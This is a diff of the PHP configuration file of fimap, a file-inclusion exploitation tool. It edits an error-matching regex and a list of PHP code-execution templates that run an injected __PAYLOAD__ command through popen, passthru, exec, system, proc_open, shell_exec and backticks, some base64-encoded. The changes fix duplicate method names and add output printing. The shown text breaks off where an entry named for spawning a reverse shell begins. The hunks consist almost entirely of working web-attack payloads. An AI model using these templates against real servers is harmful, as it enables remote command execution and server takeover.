@@ -1,6 +1,6 @@
 <?xml version="1.0" encoding="UTF-8"?>
 <fimap language="php" revision="5" force_inclusion_test="0" autor="Iman Karim (imax@tha-imax.de)" >
-	<snipe regex="<b>Warning</b>:  [\w_]+\((%s)\) ([\w_:()<>\[\]=\' /.]+) failed to open stream: No such file or directory in <b>([\w_:/.]+)</b>" />
+	<snipe regex=""<b>Warning</b>:  [\w_]+\((%s)\) ([\w_:()<>\[\]=\' /.]+) failed to open stream: No such file or directory in <b>([\w_:/.]+)</b>"" />
 	<relative_files>
 	</relative_files>
 	
@@ -22,26 +22,26 @@
 		<exec unix="1" win="0" dobase64="1" name="popen[b64]"    source='&lt;?php $h=popen(base64_decode("__PAYLOAD__") . " 2&gt;&amp;1", "r");while(!feof($h)){$l=fread($h, 2024);echo $l;}?&gt;' />
 		<exec unix="1" win="0" dobase64="1" name="passthru[b64]" source='&lt;?php passthru (base64_decode("__PAYLOAD__"). " 2&gt;&amp;1"); ?&gt;' />
 		<exec unix="1" win="0" dobase64="1" name="exec[b64]"     source='&lt;?php exec(base64_decode("__PAYLOAD__"). " 2&gt;&amp;1", $arr); $data = join("\n",$arr); echo $data; ?&gt;' />
-		<exec unix="1" win="0" dobase64="1" name="popen[b64]"    source='&lt;?php system (base64_decode("__PAYLOAD__"). " 2&gt;&amp;1"); ?&gt;' />
+		<exec unix="1" win="0" dobase64="1" name="system[b64]"    source='&lt;?php system (base64_decode("__PAYLOAD__"). " 2&gt;&amp;1"); ?&gt;' />
 		<exec unix="1" win="0" dobase64="0" name="popen"    	 source='&lt;?php $h=popen("__PAYLOAD__" . " 2&gt;&amp;1", "r");while(!feof($h)){$l=fread($h, 2024);echo $l;}?&gt;' />
 		<exec unix="1" win="0" dobase64="0" name="passthru" 	 source='&lt;?php passthru ("__PAYLOAD__". " 2&gt;&amp;1"); ?&gt;' />
-		<exec unix="1" win="0" dobase64="0" name="exec"     	 source='&lt;?php exec("__PAYLOAD__". " 2&gt;&amp;1", $arr); $data = join("\n", $arr); echo $data; ?&gt;' />
+		<exec unix="1" win="0" dobase64="0" name="exec"     	 source='&lt;?php print exec("__PAYLOAD__". " 2&gt;&amp;1", $arr); $data = join("\n", $arr); echo $data; ?&gt;' />
 		<exec unix="1" win="0" dobase64="0" name="system"    	 source='&lt;?php system ("__PAYLOAD__". " 2&gt;&amp;1"); ?&gt;' />
 		<exec unix="1" win="0" dobase64="0" name="proc_open"    	 source='&lt;?php proc_open ("__PAYLOAD__". " 2&gt;&amp;1"); ?&gt;' />
-		<exec unix="1" win="0" dobase64="0" name="shell_exec"    	 source='&lt;?php shell_exec ("__PAYLOAD__". " 2&gt;&amp;1"); ?&gt;' />
-		<exec unix="1" win="0" dobase64="0" name="backtick_operator"    	 source='&lt;?php `"__PAYLOAD__". " 2&gt;&amp;1"`; ?&gt;' />
+		<exec unix="1" win="0" dobase64="0" name="shell_exec"    	 source='&lt;?php print shell_exec ("__PAYLOAD__". " 2&gt;&amp;1"); ?&gt;' />
+		<exec unix="1" win="0" dobase64="0" name="backtick_operator"    	 source='&lt;?php print `"__PAYLOAD__". " 2&gt;&amp;1"`; ?&gt;' />
 		
 		<exec unix="0" win="1" dobase64="1" name="popen[b64][win]"    source='&lt;?php $h=popen(base64_decode("__PAYLOAD__") , "r");while(!feof($h)){$l=fread($h, 2024);echo $l;}?&gt;' />
 		<exec unix="0" win="1" dobase64="1" name="passthru[b64][win]" source='&lt;?php passthru (base64_decode("__PAYLOAD__")); ?&gt;' />
 		<exec unix="0" win="1" dobase64="1" name="exec[b64][win]"     source='&lt;?php exec(base64_decode("__PAYLOAD__"), $arr); $data = join("\n",$arr); echo $data; ?&gt;' />
-		<exec unix="0" win="1" dobase64="1" name="popen[b64][win]"    source='&lt;?php system (base64_decode("__PAYLOAD__")); ?&gt;' />
+		<exec unix="0" win="1" dobase64="1" name="system[b64][win]"    source='&lt;?php system (base64_decode("__PAYLOAD__")); ?&gt;' />
 		<exec unix="0" win="1" dobase64="0" name="popen[win]"         source='&lt;?php $h=popen("__PAYLOAD__" , "r");while(!feof($h)){$l=fread($h, 2024);echo $l;}?&gt;' />
 		<exec unix="0" win="1" dobase64="0" name="passthru[win]"      source='&lt;?php passthru ("__PAYLOAD__"); ?&gt;' />
-		<exec unix="0" win="1" dobase64="0" name="exec[win]"          source='&lt;?php exec ("__PAYLOAD__", $arr); $data = join("\n",$arr); echo $data; ?&gt;' />
+		<exec unix="0" win="1" dobase64="0" name="exec[win]"          source='&lt;?php print exec ("__PAYLOAD__", $arr); $data = join("\n",$arr); echo $data; ?&gt;' />
 		<exec unix="0" win="1" dobase64="0" name="system[win]"        source='&lt;?php system ("__PAYLOAD__"); ?&gt;' />
 		<exec unix="0" win="1" dobase64="0" name="proc_open[win]"    	 source='&lt;?php proc_open ("__PAYLOAD__"); ?&gt;' />
-		<exec unix="0" win="1" dobase64="0" name="shell_exec[win]"    	 source='&lt;?php shell_exec ("__PAYLOAD__"); ?&gt;' />
-	</exec_methods> 
+		<exec unix="0" win="1" dobase64="0" name="shell_exec[win]"    	 source='&lt;?php print shell_exec ("__PAYLOAD__"); ?&gt;' />
+	</exec_methods>
 	
 	<payloads>
 		<payload name="Spawn pentestmonkey's reverse shell" dobase64="0" inshell="0" unix="1" win="0">
